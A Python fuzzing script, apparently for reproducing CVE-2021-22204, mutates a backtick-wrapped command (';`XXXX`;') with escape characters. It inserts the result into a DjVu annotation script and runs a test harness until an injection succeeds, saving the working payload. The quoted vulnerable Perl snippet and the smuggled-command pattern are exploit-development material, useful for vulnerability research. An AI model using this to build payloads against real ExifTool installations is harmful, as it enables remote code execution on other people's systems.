
import random
import os.path
import os 
import math
import subprocess
import time

"""
    # must protect unescaped "$" and "@" symbols, and "\" at end of string
    $tok =~ s{\\(.)|([\$\@]|\\$)}{'\\'.($2 || $1)}sge;
    # convert C escape sequences (allowed in quoted text)
    $tok = eval qq{"$tok"};
    # convert C escape sequences, allowed in quoted text
    # (note: this only converts a few of them!)
    my %esc = ( a => "\a", b => "\b", f => "\f", n => "\n",
                r => "\r", t => "\t", '"' => '"', '\\' => '\\' );
    $tok =~ s/\\(.)/$esc{$1}||'\\'.$1/egs; 
"""
specialChars = ["\"","\"","\\"," ","\r","\n","\b","\a","\f","\t"," "," ","\\"]
specialChars+= ["\\\""]
specialChars += ["\\\\"]
specialChars += ["\\\\\\"]

#specialChars+=[",\\n"]*10
dicts = specialChars #+ [chr(i) for i in range(256)]
#dicts +=  [('\\%03o' % i)  for i in range(256)]

payload = ""
mutatefile = open("./mutateList","wb")
payloadfilename = "./payloads/payload"+str(random.randint(0,9999))+".bin"
crashingpayloadfile = open(payloadfilename,"wb")


def mutateCommand(cmd):
    for i in range(random.randint(1,6)):
        cmd = bytes(random.choice(dicts), 'utf-8') + cmd
    #for i in range(random.randint(1,6)):
    #    cmd += bytes(random.choice(dicts), 'utf-8') 
        
    print ("Mutated to : " + str(cmd))
    cmd = cmd.replace(b"\r\n",b"\n")

    mutatefile.write(cmd)
    return cmd

def main():
    starttime = time.perf_counter()
    #os.system("C:\\Windows\\System32\\cmd.exe")
    while True:
        #if os.path.isfile("./pwned.txt"):
        #    break


        # main goal is to try to get the file to be output into /tmp/XXXXX
        # try to look for the file locating at that directory

        # in the patch, they put an enumation and when is hit one of these characters,
        # it would replace them with something else which is really interesting
        
        #testscript = open("F:\\CVE-2021-22204\\CreatePayload\\fuzz\\test"+str(random.randint(0,9999))+".script","wb")
        testscript = open("./test.script","wb")

        samplescript = open("./sample.script","rb")
        mainCommand = b"XXXX"
        
        data = samplescript.read().replace(b"\r\n",b"\n");
        payload = mutateCommand(b";`" + mainCommand + b"`;" )

        while 1:
            if data.find(b'##MARKER##') != -1:
                data = data.replace(b'##MARKER##', mutateCommand(b" "+payload), 1)
            else:
                break
        #print (data)
        testscript.write(data)
        testscript.close()

        """if b'\\\n"' in payload:
            return 
        """
        samplescript.close()
        print("Re-generating test.script file")
        
        #os.system("pause")
        #subprocess.run(["..\\DjVuLibre\\Djvused.exe","./sample2.djvu","-f","./test.script","-s"])
        r = subprocess.run("./run.sh")

        print ("Return Code : " + str(r.returncode))
        if r.returncode == 37:
            crashingpayloadfile.write(payload)
            print ("Elapsed Time : " + str(time.perf_counter()  - starttime) + " seconds ")
            break
        print ("Elapsed Time : " + str(time.perf_counter()  - starttime) + " seconds ")
        print("PAYLOAD")
        os.system("hexdump -c payloads/"+ payloadfilename)

        


main()
crashingpayloadfile.close()
print("Payload found and saved to  " + payloadfilename)
